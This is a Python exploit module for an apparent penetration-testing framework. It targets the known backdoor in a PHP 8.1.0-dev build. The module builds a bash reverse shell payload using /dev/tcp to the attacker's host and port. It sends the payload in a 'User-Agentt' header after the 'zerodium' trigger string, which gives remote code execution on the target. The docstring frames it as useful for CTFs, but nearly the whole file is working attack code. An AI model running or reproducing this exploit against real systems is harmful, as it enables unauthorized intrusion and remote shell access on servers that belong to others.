#!/usr/bin/env python3
from rmsectkf.core.modules.remote.exploit.web.web_module import WebModule
import requests

'''
Exploit for PHP 8.1.0-Dev Version, where an attacker added a
backdoor to the code. The merge request wasn't accepted, so you probably
will not find this on live systems, but maybe it's useful for some ctf's ;)
'''


class CustomModule(WebModule):

    def __init__(self):
        super().__init__()

    def init_module(self):
        super().init_module()
        self.option_lhost.required = True
        self.option_lport.required = True

    def lpart_exists(self):
        return True

    def run_module(self):
        if super().run_module() == False:
            return False

        # php reverse tcp
        payload = "exec('/bin/bash -c \"bash -i >& /dev/tcp/{}/{} 0>&1\"');"\
            .format(self.option_lhost.value, self.option_lport.value)

        # create headers for backdoor
        # zerodium was the password to trigger it
        # every code behind it will be executed
        # it's required to user User-Agentt instead of User-Agent
        headers={"User-Agentt":"zerodium{}".format(payload)}

        r = requests.get(self.option_rhosts.value[0], headers=headers)
        print("done")

def get_module():
    return CustomModule()


# start the module if it's executed directly
if __name__ == "__main__":
    module = get_module()
    module.init_module()
    module.start_module()
